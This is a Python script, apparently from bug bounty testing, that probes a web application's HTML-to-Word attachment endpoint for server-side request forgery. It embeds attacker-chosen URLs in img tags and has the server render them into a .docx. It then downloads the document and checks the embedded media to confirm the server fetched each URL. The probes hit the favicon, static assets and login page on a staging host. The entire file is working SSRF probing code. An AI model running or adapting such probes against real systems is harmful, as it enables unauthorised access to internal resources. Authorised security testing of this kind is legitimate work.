import json,subprocess,os,uuid,zipfile,io
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
def post(path,body):
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+TA,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
def get(path):
    cmd=['curl','-s','-m','40',H+path,'-H','token: '+TA,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
tag='zx'+uuid.uuid4().hex[:8]
def run(label,url,atype="105"):
    c,b=post('/api/v1/attachments/html',
       {"html":f'<h1>ZX</h1><img src="{url}" width="400" height="400">',
        "type":"word","attachableType":"AuditableEntity","attachableId":atype,
        "fileName":f"zx-{tag}-{label}"})
    if c!='200': print(f"  {label:22} gen={c} {b[:70].replace(chr(10),' ')}"); return
    aid=json.loads(b)['attachmentId']
    a=get(f'/api/v1/attachments/{aid}')['attachments'][0]
    f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
    subprocess.run(['curl','-s','-m','60','-o','/tmp/z.docx',f['url']])
    d=open('/tmp/z.docx','rb').read()
    try:
        z=zipfile.ZipFile(io.BytesIO(d))
        media=[(n,len(z.read(n))) for n in z.namelist() if 'media' in n]
        info=''
        for m,sz in media:
            if sz: info=f" head={z.read(m)[:60]!r}"
        print(f"  {label:22} docx={len(d):>6}B media={media}{info}")
    except Exception as e: print(f"  {label:22} not zip")
# repeat the exact favicon case that worked
run("favicon-repeat","https://bugbounty1.qe.optrostaging.ai/favicon.ico")
run("favicon-repeat2","https://bugbounty1.qe.optrostaging.ai/favicon.ico")
# same host, other static paths
run("static-css","https://bugbounty1.qe.optrostaging.ai/assets/main-CDW_8nVX.css")
run("static-js","https://bugbounty1.qe.optrostaging.ai/assets/main-CfpJ2FXC.js")
run("login-page","https://bugbounty1.qe.optrostaging.ai/login")
